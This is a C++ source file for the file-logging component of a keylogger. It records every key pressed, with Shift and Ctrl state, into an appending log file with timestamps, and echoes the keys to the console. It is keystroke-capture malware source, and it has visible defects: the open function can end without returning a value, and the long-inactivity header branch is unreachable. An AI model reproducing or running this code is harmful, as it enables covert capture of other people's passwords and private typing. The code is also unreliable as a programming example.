#include "FileLogger.h"

#include <ctime>
#include <string>

const std::time_t TIME_INACTIVE_PAUSE = 15;
const std::time_t TIME_INACTIVE_BREAK = 300;

namespace Keylogger {

std::string lp0(int num) {
    if (num > 9) {
        return std::to_string(num);
    }
    return "0" + std::to_string(num);
}

void writeHeader(std::ofstream &stream) {
    std::time_t t = std::time(0);
    std::tm* now = std::localtime(&t);

    stream
        << "[--- "
        << (now->tm_year + 1900) << '-' << lp0(now->tm_mon + 1) << '-' << lp0(now->tm_mday)
        << ' ' << lp0(now->tm_hour) << ':' << lp0(now->tm_min) << ':' << lp0(now->tm_sec)
        << " ---]"
        << std::endl << std::endl;
}

bool FileLogger::open(IKeycodeMapper* mapper, std::string filename) {
    _mapper = mapper;

    std::ifstream file;
    bool exists = false;

    file.open(filename);
    exists = file.is_open();
    file.close();

    _stream.open(filename, std::ios_base::app);
    if (!_stream.is_open()) {
        return false;
    }

    if (exists) {
        _stream << std::endl << std::endl;
    }

    writeHeader(_stream);
    _lastKeystroke = std::time(0);
}

void FileLogger::close() {
    _stream.close();
}

void FileLogger::logKeycode(int keycode, KeyState state) {
    std::time_t curtime = std::time(0);
    if (curtime - _lastKeystroke > TIME_INACTIVE_PAUSE) {
        _stream << std::endl;
    } else if (curtime - _lastKeystroke > TIME_INACTIVE_BREAK) {
        writeHeader(_stream);
    }
    _lastKeystroke = curtime;

    if (_mapper) {
        if (_mapper->isCtrl(keycode)) {
            _modifierCtrl = state == KeyState::Pressed;
        }
        if (_mapper->isShift(keycode)) {
            _modifierShift = state == KeyState::Pressed;
        }

        if (state == KeyState::Pressed) {
            std::cout << _mapper->keycodeToStr(keycode, _modifierShift);
            _stream << _mapper->keycodeToStr(keycode, _modifierShift);
        }
    } else {
        _stream << keycode << ":" << (state == KeyState::Pressed ? 1 : 0) << " ";
    }
    _stream.flush();
}

}
